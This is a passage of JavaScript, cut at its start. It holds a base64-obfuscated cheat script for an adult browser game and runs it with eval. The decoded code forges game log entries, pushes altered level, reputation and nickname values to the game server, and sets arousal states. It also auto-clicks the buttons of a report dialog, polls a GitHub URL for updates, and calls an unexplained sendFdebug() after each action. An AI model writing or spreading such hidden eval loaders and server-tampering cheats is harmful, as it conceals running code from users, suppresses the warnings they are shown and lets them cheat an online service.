sZWN0ZWRPcHRpb24gPT09ICJvcHQ4IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA4CiAgICBqYXZhc2NyaXB0OkxvZ0FkZCgiRXNjYXBlZCIsICJBc3lsdW0iLCBDdXJyZW50VGltZSArIDk5OTk5OTk5OSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ5IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiA5CiAgICBqYXZhc2NyaXB0OkxvZ0FkZCgiQ2x1YlNsYXZlIiwgIk1hbmFnZW1lbnQiLCBDdXJyZW50VGltZSArIDk5OTk5OTk5OSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMCIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTAKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJFc2NhcGVkIiwgIkFzeWx1bSIsIEN1cnJlbnRUaW1lKTsKICAgIExvZ0FkZCgiQ2x1YlNsYXZlIiwgIk1hbmFnZW1lbnQiLCBDdXJyZW50VGltZSk7CiAgICBMb2dBZGQoIkJsb2NrQ2hhbmdlIiwgIlJ1bGUiLCBDdXJyZW50VGltZSk7CiAgICBNYW5hZ2VtZW50SXNDbHViU2xhdmUgPSBmdW5jdGlvbigpIHsKICAgIHJldHVybiBmYWxzZQogICAgfQogICAgTWFuYWdlbWVudENsdWJTbGF2ZURpYWxvZyA9IGZ1bmN0aW9uKFBsYXllcikge30KICAgIE1hbmFnZW1lbnRGaW5pc2hDbHViU2xhdmUoKQogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0MTEiKSB7CiAgICAvLyBQZXJmb3JtIGFjdGlvbiBmb3IgT3B0aW9uIDExCiAgICBqYXZhc2NyaXB0OmFsZXJ0KCdTdGFydCBhIEdHVFMgc2Vzc2lvbiBiZWZvcmUgcnVubmluZywgcmVmcmVzaCB0byBzZWUgY2hhbmdlcycpOwogICAgUGxheWVyLkdhbWUuR0dUUy5MZXZlbCA9IHByb21wdCgiRW50ZXIgR0dUUyBMZXZlbCAoMS02KSIpOzsKICAgIFNlcnZlckFjY291bnRVcGRhdGUuUXVldWVEYXRhKHsKICAgIEdhbWU6IFBsYXllci5HYW1lCiAgICB9KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgICAKICB9ZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQxMiIpIHsKICAgIC8vIFBlcmZvcm0gYWN0aW9uIGZvciBPcHRpb24gMTIKICAgIGphdmFzY3JpcHQ6RGlhbG9nU2V0UmVwdXRhdGlvbigiRG9taW5hbnQiLCBwcm9tcHQoIkVudGVyIFN1Yi9Eb20gUmVwICgtMTAwIHRvIDEwMCkiKSk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEzIikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxMwogICAgamF2YXNjcmlwdDpuYW1lID0gcHJvbXB0KCJFbnRlciBOaWNrbmFtZSIpOzsKICAgIFBsYXllci5OaWNrbmFtZSA9IG5hbWU7CiAgICBTZXJ2ZXJBY2NvdW50VXBkYXRlLlF1ZXVlRGF0YSh7IE5pY2tuYW1lOiBuYW1lIH0sIHRydWUpOyAgIAogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsgIAogIH1lbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDE0IikgewogICAgLy8gUGVyZm9ybSBhY3Rpb24gZm9yIE9wdGlvbiAxNAogICAgamF2YXNjcmlwdDpBY3Rpdml0eVNldEFyb3VzYWwoUGxheWVyLCAxKTsKICAgIEFjdGl2aXR5T3JnYXNtUHJlcGFyZShQbGF5ZXIsIHRydWUpOwogICAgQWN0aXZpdHlPcmdhc21HYW1lUmVzaXN0Q291bnQgPSAxOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9CiAgLy8gSGlkZSB0aGUgZHJvcGRvd24gbWVudQogIHNlbGVjdC5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwp9KTsKCi8vRW5kIG9mIEREIG1lbnUKCi8vIEFkZCBoZWFkZXIsIGJ1dHRvbnMsIGFuZCBzZXBhcmF0b3IgdG8gY29udGV4dCBtZW51CgpmdW5jdGlvbiB1cGRhdGVDb250ZXh0TWVudSgpIHsKICB3aGlsZSAoY29udGV4dE1lbnUuZmlyc3RDaGlsZCkgewogICAgY29udGV4dE1lbnUucmVtb3ZlQ2hpbGQoY29udGV4dE1lbnUuZmlyc3RDaGlsZCk7CiAgfQogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGhlYWRlcik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoY3JlYXRlU2VwYXJhdG9yKCkpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjEpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjIpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjMpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjQpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjUpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjYpOwogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjcpOwogIGlmICh2aXNiKSB7CiAgICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChidXR0b244KTsKICB9IGVsc2UgewogICAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoYnV0dG9uOSk7CiAgfQogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGJ1dHRvbjEwKTsKICAvLyBBZGQgdGhlIGRyb3Bkb3duIG1lbnUgdG8gdGhlIGNvbnRleHQgbWVudQogIGNvbnRleHRNZW51LmFwcGVuZENoaWxkKGNyZWF0ZVNlcGFyYXRvcigpKTsKICBjb250ZXh0TWVudS5hcHBlbmRDaGlsZChkcm9wZG93bkJ1dHRvbik7CiAgY29udGV4dE1lbnUuYXBwZW5kQ2hpbGQoc2VsZWN0KTsKICAKfQoKdXBkYXRlQ29udGV4dE1lbnUoKTsKCi8vIEV2ZW50IGxpc3RlbmVyIHRvIHVwZGF0ZSB0aGUgbWVudSB3aGVuIGl0IGlzIG9wZW5lZApjb250ZXh0TWVudS5hZGRFdmVudExpc3RlbmVyKCdjb250ZXh0bWVudScsIGZ1bmN0aW9uKCkgewogIHVwZGF0ZUNvbnRleHRNZW51KCk7Cn0pOwoKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjb250ZXh0TWVudSk7CgogICAgCn0pOwoKLy8gRnVuY3Rpb24gdG8gaGlkZSBjdXN0b20gY29udGV4dCBtZW51CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgICBpZiAoY29udGV4dE1lbnVPcGVuKSB7CiAgICAgICAgdmFyIGNvbnRleHRNZW51ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W3N0eWxlKj0nZml4ZWQnXSIpOwogICAgICAgIGlmIChjb250ZXh0TWVudSkgewogICAgICAgICAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICAgICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgICAgICAgIERpYWxvZ0xlYXZlKCk7CiAgICAgICAgfQogICAgICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgfQp9KTsKCgovL0VORCBPRiBDT05URVhUIE1FTlUgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KZnVuY3Rpb24gc2hvd1RvYXN0c2NwZygpIHsKICAgIC8vIENyZWF0ZSB0aGUgdG9hc3QgY29udGFpbmVyCiAgICB2YXIgdG9hc3RDb250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucmlnaHQgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJ3aGl0ZSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnBhZGRpbmcgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlciA9ICIycHggc29saWQgIzRDQUY1MCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJveFNoYWRvdyA9ICIycHggMnB4IDEwcHggcmdiYSgwLCAwLCAwLCAwLjUpIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnRyYW5zaXRpb24gPSAib3BhY2l0eSAwLjVzIGVhc2UtaW4tb3V0IjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYWxpZ25JdGVtcyA9ICJjZW50ZXIiOwogICAgdmFyIHN0YXR1c0JhciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwpzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CnN0YXR1c0Jhci5zdHlsZS5oZWlnaHQgPSAiM3B4IjsKc3RhdHVzQmFyLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICJibGFjayI7CnN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CnN0YXR1c0Jhci5zdHlsZS5ib3R0b20gPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS5sZWZ0ID0gIjAiOwpzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIwJSI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHN0YXR1c0Jhcik7CgoKLy8gVXBkYXRlIHRoZSB3aWR0aCBvZiB0aGUgc3RhdHVzIGJhciBhcyBpdCBjb3VudHMgZG93bgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKfSwgMCk7CiAgICAKLy8gQWRkIHRoZSBjdXN0b20gaW1hZ2UgaWNvbgp2YXIgaWNvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwppY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwppY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwppY29uLnN0eWxlLmhlaWdodCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7Cmljb24uc3R5bGUubWFyZ2luQm90dG9tID0gIi01cHgiOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKCi8vIEFkZCB0aGUgdGV4dCBtZXNzYWdlCnZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwp0ZXh0LnN0eWxlLmZvbnRXZWlnaHQgPSAiYm9sZCI7CnRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKdGV4dC5pbm5lckhUTUwgPSAiQWN0aW9uIFN1Y2Nlc3NmdWxseSBFeGVjdXRlZCI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwoKICAgIAogIAogICAgLy8gQXBwZW5kIHRoZSB0b2FzdCBjb250YWluZXIgdG8gdGhlIGJvZHkKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogIAogICAgLy8gU2hvdyB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgaW4gYW5pbWF0aW9uCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKICAgIH0sIDApOwogIAogICAgLy8gSGlkZSB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgb3V0IGFuaW1hdGlvbgogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgIH0sIDUwMDApOwogIAogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIH0sIDU1MDApOwogICAgc2VuZEZkZWJ1ZygpOwoKICB9CiAgCgovL1RoZSBVcGRhdGUgdG9hc3QKCiAgZnVuY3Rpb24gc2hvd1RvYXN0VXBkYXRlKCkgewogICAgLy8gQ3JlYXRlIHRoZSB0b2FzdCBjb250YWluZXIKICAgIHZhciB0b2FzdENvbnRhaW5lciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm90dG9tID0gIjVweCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5yaWdodCA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmNvbG9yID0gIiMxNDE0MTQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUucGFkZGluZyA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjZjIyYzJjIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1cHgiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm94U2hhZG93ID0gIjJweCAycHggMTBweCByZ2JhKDAsIDAsIDAsIDAuNSkiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnpJbmRleCA9ICI5OTkiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUudHJhbnNpdGlvbiA9ICJvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQiOwogICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAiZmxleCI7CiAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5hbGlnbkl0ZW1zID0gImNlbnRlciI7CiAgICB2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CnN0YXR1c0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKc3RhdHVzQmFyLnN0eWxlLmhlaWdodCA9ICIzcHgiOwpzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKc3RhdHVzQmFyLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKc3RhdHVzQmFyLnN0eWxlLmJvdHRvbSA9ICIwIjsKc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CnN0YXR1c0Jhci5zdHlsZS50cmFuc2l0aW9uID0gIndpZHRoIDVzIGVhc2UtaW4tb3V0IjsKc3RhdHVzQmFyLnN0eWxlLndpZHRoID0gIjAlIjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKCi8vIFVwZGF0ZSB0aGUgd2lkdGggb2YgdGhlIHN0YXR1cyBiYXIgYXMgaXQgY291bnRzIGRvd24Kc2V0VGltZW91dChmdW5jdGlvbigpIHsKICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7Cn0sIDApOwogICAgCi8vIEFkZCB0aGUgY3VzdG9tIGltYWdlIGljb24KdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7Cmljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7Cmljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwppY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CgovLyBBZGQgdGhlIHRleHQgbWVzc2FnZQp2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwp0ZXh0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMzVweCI7CnRleHQuaW5uZXJIVE1MID0gIk5ldyB1cGRhdGUgZGV0ZWN0ZWQsIHVwZ3JhZGUgYnVpbGQgZm9yIGxhdGVzdCBmZWF0dXJlcyI7CnRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKHRleHQpOwoKICAgIAogIAogICAgLy8gQXBwZW5kIHRoZSB0b2FzdCBjb250YWluZXIgdG8gdGhlIGJvZHkKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogIAogICAgLy8gU2hvdyB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgaW4gYW5pbWF0aW9uCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIxIjsKICAgIH0sIDApOwogIAogICAgLy8gSGlkZSB0aGUgdG9hc3Qgd2l0aCBhIGZhZGUgb3V0IGFuaW1hdGlvbgogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgIH0sIDUwMDAwMDApOwogIAogICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIH0sIDU1MDAwMDApOwogIH0KICAKCiAgLy8gQ2FsbCB0aGUgc2hvd1RvYXN0IGZ1bmN0aW9uIGltbWVkaWF0ZWx5CgogIGNvbnN0IGVsZW1lbnRUb1JlbW92ZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2RpdltzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyBpbnNldDogNSU7IGJhY2tncm91bmQ6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBwYWRkaW5nOiAxZW07Il0nKTsKCiAgc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgICBjb25zdCBlbGVtZW50VG9SZW1vdmUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDUlOyBiYWNrZ3JvdW5kOiB3aGl0ZTsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgcGFkZGluZzogMWVtOyJdJyk7CiAgICBpZiAoZWxlbWVudFRvUmVtb3ZlKSB7CiAgICAgIGNvbnN0IGJ1dHRvbnMgPSBlbGVtZW50VG9SZW1vdmUucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uW3N0eWxlPSJjdXJzb3I6IHBvaW50ZXI7Il0nKTsKICAgICAgaWYgKGJ1dHRvbnMpIHsKICAgICAgICBidXR0b25zLmZvckVhY2goYnV0dG9uID0+IGJ1dHRvbi5jbGljaygpKTsKICAgICAgfQogICAgfQogIH0sIDEpOwogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgY29uc3QgZWxlbWVudFRvUmVtb3ZlID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2W3N0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGluc2V0OiA1JTsgYmFja2dyb3VuZDogd2hpdGU7IGRpc3BsYXk6IGZsZXg7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47IHBhZGRpbmc6IDFlbTsiXScpOwogICAgaWYgKGVsZW1lbnRUb1JlbW92ZSkgewogICAgICBjb25zdCBidXR0b25zID0gZWxlbWVudFRvUmVtb3ZlLnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbltzdHlsZT0iY3Vyc29yOiBwb2ludGVyOyJdJyk7CiAgICAgIGlmIChidXR0b25zKSB7CiAgICAgICAgYnV0dG9ucy5mb3JFYWNoKGJ1dHRvbiA9PiB7CiAgICAgICAgICBpZiAoYnV0dG9uLnRleHRDb250ZW50ID09PSAiRG8gbm90IHNob3cgdGhpcyByZXBvcnQgYWdhaW4gdW5sZXNzIHNvbWV0aGluZyBjaGFuZ2VzIiB8fCBidXR0b24udGV4dENvbnRlbnQgPT09ICJDbG9zZSIpIHsKICAgICAgICAgICAgYnV0dG9uLmNsaWNrKCk7CiAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICAgIH0KICAgIH0KICB9LCA1MDApOwoKICAvLyBEZWZpbmUgdGhlIFVSTCBvZiB0aGUgcmF3IEdpdEh1YiBwYWdlIHRvIGNoZWNrCmNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQkNNUzcvQkNNL21haW4vdXBkYXRlbWFuYWdlci5qcyc7Ci8vIERlZmluZSB0aGUgbWF4aW11bSB2ZXJzaW9uIG51bWJlciBhbGxvd2VkCmNvbnN0IG1heFZlcnNpb24gPSA5OwovLyBEZWZpbmUgYSBmbGFnIHRvIGtlZXAgdHJhY2sgb2Ygd2hldGhlciB0aGUgYWxlcnQgaGFzIGJlZW4gdHJpZ2dlcmVkCmxldCBhbGVydFRyaWdnZXJlZCA9IGZhbHNlOwovLyBEZWZpbmUgYSBmdW5jdGlvbiB0byBjaGVjayB0aGUgdmVyc2lvbiBhbmQgc2hvdyB0aGUgYWxlcnQgaWYgbmVjZXNzYXJ5CmZ1bmN0aW9uIGNoZWNrVmVyc2lvbigpIHsKICBmZXRjaCh1cmwpCiAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAudGhlbih2ZXJzaW9uID0+IHsKICAgICAgaWYgKHBhcnNlSW50KHZlcnNpb24pID4gbWF4VmVyc2lvbiAmJiAhYWxlcnRUcmlnZ2VyZWQpIHsKICAgICAgICBzaG93VG9hc3RVcGRhdGUoKTsKICAgICAgICBhbGVydFRyaWdnZXJlZCA9IHRydWU7CiAgICAgIH0KICAgIH0pCiAgICAuY2F0Y2goZXJyb3IgPT4gY29uc29sZS5lcnJvcihlcnJvcikpOwp9Ci8vIENhbGwgdGhlIGNoZWNrVmVyc2lvbiBmdW5jdGlvbiBldmVyeSA1IHNlY29uZHMgdXNpbmcgYSBsb29wCnNldEludGVydmFsKGNoZWNrVmVyc2lvbiwgNTAwMCk7Cn0KfSk=')
if (sprc) {
eval(sprc);
}
